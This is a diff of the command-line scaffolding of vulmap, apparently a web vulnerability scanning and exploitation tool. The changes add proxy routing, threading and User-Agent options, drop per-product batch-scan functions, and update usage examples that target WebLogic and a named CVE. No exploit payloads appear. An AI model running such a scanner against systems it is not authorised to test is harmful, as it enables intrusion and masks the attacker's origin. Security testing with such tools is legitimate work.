-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Drupal vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.drupal(furl)
-    # Elasticsearch =======================================
-    def elasticsearch_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Elasticsearch vulnerability scan"))
-        Start.elasticsearch(self)
-    def elasticsearch_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Elasticsearch vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.elasticsearch(furl)
-    # Jenkins =============================================
-    def jenkins_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Jenkins vulnerability scan"))
-        Start.jenkins(self)
-    def jenkins_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Jenkins vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.jenkins(furl)
-    # Nexus ===============================================
-    def nexus_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Nexus vulnerability scan"))
-        Start.nexus(self)
-    def nexus_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Nexus vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.nexus(furl)
-    # Oracle Weblogic ====================================
-    def oracle_weblogic_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Oracle Weblogic vulnerability scan"))
-        Start.oracle_weblogic(self)
-    def oracle_weblogic_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Oracle Weblogic vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.oracle_weblogic(furl)
-    # RedHat Jboss ========================================
-    def redhat_jboss_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run RedHat JBoss vulnerability scan"))
-        Start.redhat_jboss(self)
-    def redhat_jboss_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run RedHat JBoss vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.redhat_jboss(furl)
-    # ThinkPHP ============================================
-    def thinkphp_url(self):
-        print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run ThinkPHP vulnerability scan"))
-        Start.thinkphp(self)
-    def thinkphp_file(self):
-        with open(self) as f:
-            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run ThinkPHP vulnerability scan"))
-            while True:
-                furl = f.readline()
-                furl = furl.strip('\r\n')
-                furl = furl.strip()
-                if not furl:
-                    break
-                if furl[-1] == "/":
-                    furl = furl[:-1]
-                Start.thinkphp(furl)
-
-
 def version():
-    version = "0.4"
+    version = "0.5"
     github_ver_url = "https://github.com/zhzyker/vulmap/blob/main/version"      
     try:
         github_ver_request = requests.get(url=github_ver_url, timeout=5)
@@ -15002,6 +15241,26 @@ def survival_check(url):
     except:
         return "f"
 
+def proxy_set(pr, pr_mode):
+    proxy_ip = str(re.search(r"(.*):", pr).group(1))
+    proxy_port = int(re.search(r":(.*)", pr).group(1))
+    if proxy_ip == None or proxy_port == None:
+        print(now.timed(de=0) + color.rewarn() + color.red(" Proxy format error (e.g. --proxy-socks 127.0.0.1:1080)"))
+        sys.exit(0)
+    if r"socks" in pr_mode:
+        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+    elif r"http" in pr_mode:
+        socks.set_default_proxy(socks.HTTP, addr=proxy_ip, port=proxy_port)
+    socket.socket = socks.socksocket
+    try:
+        proxy_ipinfo = requests.get("http://api.hostip.info/get_json.php", headers=HEADERS, timeout=5)
+        proxy_ipinfo_json = json.loads(proxy_ipinfo.text)
+        proxy_ipinfo_dict = "[region: " + proxy_ipinfo_json["country_name"] + "] " + "[city: " + proxy_ipinfo_json["city"] + "] " + "[proxy ip: " + proxy_ipinfo_json["ip"] + "]"
+    except:
+        proxy_ipinfo_dict = "[region: ???] [city: ???] [proxy ip: ???]"
+    print(now.timed(de=0) + color.yeinfo() + color.yellow(" Use custom proxy: " + pr))
+    print(now.timed(de=0) + color.yeinfo() + color.yellow(" Proxy info: " + proxy_ipinfo_dict))
+
 def cmdlineparser(argv=None):
     print(color.yellow("""                   __
                   [  |                              
@@ -15010,9 +15269,9 @@ def cmdlineparser(argv=None):
   \ \/ /  | \_/ |, | |  | | | | | | // | |,| \__/ | 
    \__/   '.__.'_/[___][___||__||__]\'-;__/| ;.___/  
                                           [__|"""))
-    parser = argparse.ArgumentParser(usage="python3 vulmap [options]")
+    parser = argparse.ArgumentParser(usage="python vulmap [options]")
     # target option
-    target = parser.add_argument_group("target", "you must use the -u option to specify a target, usually https://example.com or http://example.com:443  Use -u to check one target, use -f to batch check")
+    target = parser.add_argument_group("target", "you must use the -u option to specify a target, usually https://example.com or http://example.com:443 or 127.0.0.1:8080")
     target.add_argument("-u", "--url",
                         dest="url",
                         type=str,
@@ -15047,8 +15306,7 @@ def cmdlineparser(argv=None):
     mode.add_argument("--debug",
                       dest="debug",
                       action='store_false',
-                      help="debug mode echo request and responses")
-                      
+                      help="exp mode echo request and responses, poc mode echo vuln lists")
     # time and delay
     time = parser.add_argument_group("time", "check time options")
     time.add_argument("--delay",
@@ -15059,8 +15317,29 @@ def cmdlineparser(argv=None):
     time.add_argument("--timeout",
                       dest="TIMEOUT",
                       type=int,
-                      default=10,
-                      help="scan timeout time, default 10s")
+                      default=5,
+                      help="scan timeout time, default 5s")
+    # general
+    general = parser.add_argument_group("general", "general options")
+    general.add_argument("-t", "--thread",
+                         dest="thread_num",
+                         type=int,
+                         default=10,
+                         metavar='NUM',
+                         help="number of scanning function threads, default 10 threads")
+    general.add_argument("--user-agent",
+                         dest="ua",
+                         type=str,
+                         default="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+                         help="You can customize the User-Agent header with the change option")
+    general.add_argument("--proxy-socks",
+                         dest="socks",
+                         type=str,
+                         help="socks proxy (e.g. --proxy-socks 127.0.0.1:1080)")
+    general.add_argument("--proxy-http",
+                         dest="http",
+                         type=str,
+                         help="http proxy (e.g. --proxy-http 127.0.0.1:8080)")
     # output 
     output = parser.add_argument_group("output", "poc mode scan result export")
     output.add_argument("-o", "--output",
@@ -15071,15 +15350,15 @@ def cmdlineparser(argv=None):
                         help="text mode export (e.g. -o \"result.txt\")")
     support = parser.add_argument_group("support")
     support.add_argument(dest="types of vulnerability scanning:\n  "
-                              "activemq, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, nexus, weblogic, jboss, thinkphp",
+                              "activemq, flink, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, nexus, weblogic, jboss, thinkphp",
                          action='store_false')
     example = parser.add_argument_group("examples")
-    example.add_argument(dest="python3 vulmap.py -u http://example.com\n  "
-                              "python3 vulmap.py -u http://example.com -a struts2\n  "
-                              "python3 vulmap.py -u http://example.com:7001 -m poc -a weblogic --delay 1 --timeout 15\n  "
-                              "python3 vulmap.py -u http://example.com:7001 -v CVE-2019-2729\n  "
-                              "python3 vulmap.py -f list.txt -a weblogic\n  "
-                              "python3 vulmap.py -f list.txt -o results.txt",
+    example.add_argument(dest="python vulmap.py -u http://example.com\n  "
+                              "python vulmap.py -u http://example.com -a struts2\n  "
+                              "python vulmap.py -u http://example.com:7001 -m poc -a weblogic --delay 1 --timeout 15\n  "
+                              "python vulmap.py -u http://example.com:7001 -v CVE-2019-2729\n  "
+                              "python vulmap.py -f list.txt -a weblogic -t 30\n  "
+                              "python vulmap.py -f list.txt -o results.txt",
                          action='store_false')
     args = parser.parse_args()
     version()
@@ -15097,13 +15376,31 @@ def cmdlineparser(argv=None):
     CMD = args.cmd
     global RUNALLPOC
     RUNALLPOC = False
+    global THREADNUM
+    THREADNUM = args.thread_num
+    global USER_AGENT
+    USER_AGENT = args.ua
+    global HEADERS
+    HEADERS = {
+        'Accept': 'application/x-shockwave-flash,'
+                  'image/gif,'
+                  'image/x-xbitmap,'
+                  'image/jpeg,'
+                  'image/pjpeg,'
+                  'application/vnd.ms-excel,'
+                  'application/vnd.ms-powerpoint,'
+                  'application/msword,'
+                  '*/*',
+        'User-agent': USER_AGENT,
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    # proxy support socks5 http https
+    if args.socks:
+        proxy_set(args.socks, "socks")
+    elif args.http:
+        proxy_set(args.http, "http")
     # check url format
     args.url = url_check(args.url)
-    # survival = survival_check(args.url)
-    # if survival == "f":
-    #     print(now.timed(de=0) + color.rewarn() + color.red(" "+str(args.url) +" Survival check failed"))
-    #     sys.exit(0)
-
     if args.list is False:
         print(now.timed(de=0) + color.yeinfo() + color.yellow(" List of supported vulnerabilities"))
         print(vulnlist)
@@ -15118,7 +15415,6 @@ def cmdlineparser(argv=None):
         if args.url is not None and args.file is None:
             if OUTPUT is not None:
                 print(now.timed(de=DELAY) + color.yeinfo() + color.cyan(" Scan results output to: " + OUTPUT))
-                verify.text_output("[*] " + str(args.url))
             # -u 模式检测一个URL
             if args.app == None or args.app == "all":
                 RUNALLPOC = True
@@ -15128,7 +15424,7 @@ def cmdlineparser(argv=None):
         elif args.file is not None and args.url is None:
             # -f 模式检测批量URL
             if args.app == None or args.app == "all":
-                RUNALLPOC = True
+                RUNALLPOC = "FILE"
                 Target.allvuln_file(args.file)
             else:
                 Target.webapps_file(args.file, args.app)
@@ -15140,3 +15436,4 @@ def cmdlineparser(argv=None):
     else:
         print(now.timed(de=0) + color.rewarn() + color.red(" Options error ... ..."))
 cmdlineparser(sys.argv)
+
